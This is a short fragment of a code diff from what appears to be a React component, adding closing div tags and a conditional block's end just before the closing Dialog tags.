+              </div>
+            </div>
+          )}
         </DialogContent>
       </Dialog>
     </div>
